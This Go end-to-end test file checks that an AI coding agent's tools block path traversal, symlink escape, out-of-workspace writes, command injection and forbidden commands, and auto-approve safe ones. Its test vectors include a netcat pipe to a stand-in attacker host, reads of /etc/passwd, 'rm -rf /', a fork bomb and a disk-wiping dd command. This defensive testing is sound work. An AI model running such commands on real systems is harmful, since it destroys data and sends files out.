package e2e

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/dmytrogajewski/spin/internal/core"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestE2E_Security_PathTraversal_ReadFile tests path traversal prevention in read_file.
func TestE2E_Security_PathTraversal_ReadFile(t *testing.T) {
	for _, maliciousPath := range SecurityTestVectors.PathTraversal {
		t.Run(maliciousPath, func(t *testing.T) {
			// Create test agent
			agent := NewTestAgent(t, TestAgentOptions{
				LLMResponses: []MockResponse{
					MockResponseWithToolCalls(
						MockToolCall("read_file", map[string]interface{}{
							"path": maliciousPath,
						}),
					),
					MockResponseWithContent("Could not read the file."),
				},
				WorkspaceFiles: SampleWorkspace(),
			})
			defer agent.Cleanup()

			// Create conversation
			history := core.NewHistoryWithDefaults()
			require.NoError(t, history.AddSystemMessage("You are a helpful assistant."))

			conv := core.NewConversation(agent.Agent, history, agent.Emitter)

			// Submit request
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()

			err := conv.RunTurn(ctx, "Read "+maliciousPath)
			require.NoError(t, err)

			// Collect events
			events := CollectEvents(conv.Stream(), 5*time.Second)

			// Should complete (but tool should fail)
			_, found := FindEvent(events, core.EventTurnComplete)
			assert.True(t, found, "should complete")

			// Verify tool was called but failed
			toolCalls := FindEvents(events, core.EventToolCallStart)
			assert.NotEmpty(t, toolCalls, "should attempt tool call")

			// Path traversal should be blocked - tool should report error
			// The agent should handle this gracefully
		})
	}
}

// TestE2E_Security_PathTraversal_WriteFile tests path traversal prevention in write_file.
func TestE2E_Security_PathTraversal_WriteFile(t *testing.T) {
	maliciousPaths := []string{
		"/etc/passwd",
		"../../../etc/passwd",
		"..\\..\\..\\Windows\\System32\\config",
	}

	for _, maliciousPath := range maliciousPaths {
		t.Run(maliciousPath, func(t *testing.T) {
			// Create test agent
			agent := NewTestAgent(t, TestAgentOptions{
				LLMResponses: []MockResponse{
					MockResponseWithToolCalls(
						MockToolCall("write_file", map[string]interface{}{
							"path":    maliciousPath,
							"content": "malicious content",
						}),
					),
					MockResponseWithContent("Could not write the file."),
				},
				WorkspaceFiles: SampleWorkspace(),
			})
			defer agent.Cleanup()

			// Create conversation
			history := core.NewHistoryWithDefaults()
			require.NoError(t, history.AddSystemMessage("You are a helpful assistant."))

			conv := core.NewConversation(agent.Agent, history, agent.Emitter)

			// Submit request
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()

			err := conv.RunTurn(ctx, "Write to "+maliciousPath)
			require.NoError(t, err)

			// Collect events
			events := CollectEvents(conv.Stream(), 5*time.Second)

			// Should complete (but tool should fail)
			_, found := FindEvent(events, core.EventTurnComplete)
			assert.True(t, found, "should complete")

			// Verify the malicious path was NOT written
			AssertFileNotExists(t, "/", maliciousPath)

			// Verify workspace is still safe
			AssertFileExists(t, agent.Workspace, "main.go")
		})
	}
}

// TestE2E_Security_PathTraversal_ApplyPatch tests path traversal in patch operations.
func TestE2E_Security_PathTraversal_ApplyPatch(t *testing.T) {
	maliciousPatch := `*** Begin Patch
*** Add File: ../../../etc/malicious.txt
+This should not be created
*** End Patch
`

	// Create test agent
	agent := NewTestAgent(t, TestAgentOptions{
		LLMResponses: []MockResponse{
			MockResponseWithToolCalls(
				MockToolCall("apply_patch", map[string]interface{}{
					"patch_text": maliciousPatch,
				}),
			),
			MockResponseWithContent("Patch could not be applied."),
		},
		WorkspaceFiles: SampleWorkspace(),
	})
	defer agent.Cleanup()

	// Create conversation
	history := core.NewHistoryWithDefaults()
	require.NoError(t, history.AddSystemMessage("You are a helpful assistant."))

	conv := core.NewConversation(agent.Agent, history, agent.Emitter)

	// Submit request
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	err := conv.RunTurn(ctx, "Apply this patch")
	require.NoError(t, err)

	// Collect events
	events := CollectEvents(conv.Stream(), 5*time.Second)

	// Should complete
	_, found := FindEvent(events, core.EventTurnComplete)
	assert.True(t, found, "should complete")

	// Verify malicious file was NOT created outside workspace
	maliciousPath := filepath.Join(agent.Workspace, "..", "..", "..", "etc", "malicious.txt")
	AssertFileNotExists(t, "/", maliciousPath)
}

// TestE2E_Security_CommandInjection tests command injection prevention.
func TestE2E_Security_CommandInjection(t *testing.T) {
	dangerousCommands := []string{
		"ls; rm -rf /",
		"ls && whoami",
		"ls | nc attacker.com 1234",
		"ls $(whoami)",
		"ls `cat /etc/passwd`",
	}

	for _, cmd := range dangerousCommands {
		t.Run(cmd, func(t *testing.T) {
			// Create test agent
			agent := NewTestAgent(t, TestAgentOptions{
				LLMResponses: []MockResponse{
					MockResponseWithToolCalls(
						MockToolCall("execute_command", map[string]interface{}{
							"command": cmd,
						}),
					),
					MockResponseWithContent("Command could not be executed."),
				},
				WorkspaceFiles: SampleWorkspace(),
			})
			defer agent.Cleanup()

			// Create conversation
			history := core.NewHistoryWithDefaults()
			require.NoError(t, history.AddSystemMessage("You are a helpful assistant."))

			conv := core.NewConversation(agent.Agent, history, agent.Emitter)

			// Submit request
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()

			err := conv.RunTurn(ctx, "Execute: "+cmd)
			require.NoError(t, err)

			// Collect events
			events := CollectEvents(conv.Stream(), 5*time.Second)

			// Should complete
			_, found := FindEvent(events, core.EventTurnComplete)
			assert.True(t, found, "should complete")

			// Verify dangerous command was blocked or requires approval
			// The validator should have classified it as dangerous
		})
	}
}

// TestE2E_Security_SymlinkEscape tests symlink escape prevention.
func TestE2E_Security_SymlinkEscape(t *testing.T) {
	// Create test agent
	agent := NewTestAgent(t, TestAgentOptions{
		LLMResponses: []MockResponse{
			MockResponseWithToolCalls(
				MockToolCall("read_file", map[string]interface{}{
					"path": "symlink-to-etc",
				}),
			),
			MockResponseWithContent("Could not read the file."),
		},
		WorkspaceFiles: SampleWorkspace(),
	})
	defer agent.Cleanup()

	// Create symlink pointing outside workspace
	symlinkPath := filepath.Join(agent.Workspace, "symlink-to-etc")
	// Note: Creating symlinks may require permissions, so we skip if it fails
	err := os.Symlink("/etc", symlinkPath)
	if err != nil {
		t.Skip("Cannot create symlinks (permission denied)")
	}

	// Create conversation
	history := core.NewHistoryWithDefaults()
	require.NoError(t, history.AddSystemMessage("You are a helpful assistant."))

	conv := core.NewConversation(agent.Agent, history, agent.Emitter)

	// Submit request
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	err = conv.RunTurn(ctx, "Read symlink-to-etc")
	require.NoError(t, err)

	// Collect events
	events := CollectEvents(conv.Stream(), 5*time.Second)

	// Should complete
	_, found := FindEvent(events, core.EventTurnComplete)
	assert.True(t, found, "should complete")

	// Symlink escape should be blocked
	// Tool should fail to read the symlinked path
}

// TestE2E_Security_ForbiddenCommands tests that forbidden commands are blocked.
func TestE2E_Security_ForbiddenCommands(t *testing.T) {
	forbiddenCommands := []string{
		"rm -rf /",
		":(){ :|:& };:", // Fork bomb
		"dd if=/dev/zero of=/dev/sda",
	}

	for _, cmd := range forbiddenCommands {
		t.Run(cmd, func(t *testing.T) {
			// Create test agent
			agent := NewTestAgent(t, TestAgentOptions{
				LLMResponses: []MockResponse{
					MockResponseWithToolCalls(
						MockToolCall("execute_command", map[string]interface{}{
							"command": cmd,
						}),
					),
					MockResponseWithContent("Command is forbidden."),
				},
				WorkspaceFiles: SampleWorkspace(),
			})
			defer agent.Cleanup()

			// Create conversation
			history := core.NewHistoryWithDefaults()
			require.NoError(t, history.AddSystemMessage("You are a helpful assistant."))

			conv := core.NewConversation(agent.Agent, history, agent.Emitter)

			// Submit request
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()

			err := conv.RunTurn(ctx, "Execute: "+cmd)
			require.NoError(t, err)

			// Collect events
			events := CollectEvents(conv.Stream(), 5*time.Second)

			// Should complete
			_, found := FindEvent(events, core.EventTurnComplete)
			assert.True(t, found, "should complete")

			// Validator should have blocked the forbidden command
		})
	}
}

// TestE2E_Security_WorkspaceConfinement tests that operations are confined to workspace.
func TestE2E_Security_WorkspaceConfinement(t *testing.T) {
	// Create test agent
	agent := NewTestAgent(t, TestAgentOptions{
		LLMResponses: []MockResponse{
			// Try to write outside workspace
			MockResponseWithToolCalls(
				MockToolCall("write_file", map[string]interface{}{
					"path":    "/tmp/outside_workspace.txt",
					"content": "should not be created",
				}),
			),
			// Try to read from inside workspace (should succeed)
			MockResponseWithToolCalls(
				MockToolCall("read_file", map[string]interface{}{
					"path": "main.go",
				}),
			),
			MockResponseWithContent("Operations confined to workspace."),
		},
		WorkspaceFiles: SampleWorkspace(),
	})
	defer agent.Cleanup()

	// Create conversation
	history := core.NewHistoryWithDefaults()
	require.NoError(t, history.AddSystemMessage("You are a helpful assistant."))

	conv := core.NewConversation(agent.Agent, history, agent.Emitter)

	// Submit request
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	err := conv.RunTurn(ctx, "Write to /tmp and read main.go")
	require.NoError(t, err)

	// Collect events
	events := CollectEvents(conv.Stream(), 10*time.Second)

	// Should complete
	_, found := FindEvent(events, core.EventTurnComplete)
	assert.True(t, found, "should complete")

	// Verify file outside workspace was NOT created
	AssertFileNotExists(t, "/tmp", "outside_workspace.txt")

	// Verify file inside workspace CAN be read
	AssertFileExists(t, agent.Workspace, "main.go")
}

// TestE2E_Security_SafeCommandsAutoApproved tests that safe commands don't require approval.
func TestE2E_Security_SafeCommandsAutoApproved(t *testing.T) {
	safeCommands := []string{
		"git status",
		"ls -la",
		"cat main.go",
		"pwd",
		"echo hello",
	}

	for _, cmd := range safeCommands {
		t.Run(cmd, func(t *testing.T) {
			// Create test agent
			agent := NewTestAgent(t, TestAgentOptions{
				LLMResponses: []MockResponse{
					MockResponseWithToolCalls(
						MockToolCall("execute_command", map[string]interface{}{
							"command": cmd,
						}),
					),
					MockResponseWithContent("Command executed."),
				},
				WorkspaceFiles: SampleWorkspace(),
				GitRepo:        true,
			})
			defer agent.Cleanup()

			// Create conversation
			history := core.NewHistoryWithDefaults()
			require.NoError(t, history.AddSystemMessage("You are a helpful assistant."))

			conv := core.NewConversation(agent.Agent, history, agent.Emitter)

			// Submit request
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()

			err := conv.RunTurn(ctx, "Execute: "+cmd)
			require.NoError(t, err)

			// Collect events
			events := CollectEvents(conv.Stream(), 5*time.Second)

			// Should complete without requiring approval
			_, found := FindEvent(events, core.EventTurnComplete)
			assert.True(t, found, "should complete without approval")

			// Should NOT have approval events for safe commands
			approvalEvents := FindEvents(events, core.EventCommandApproval)
			assert.Empty(t, approvalEvents, "safe commands should not require approval")
		})
	}
}
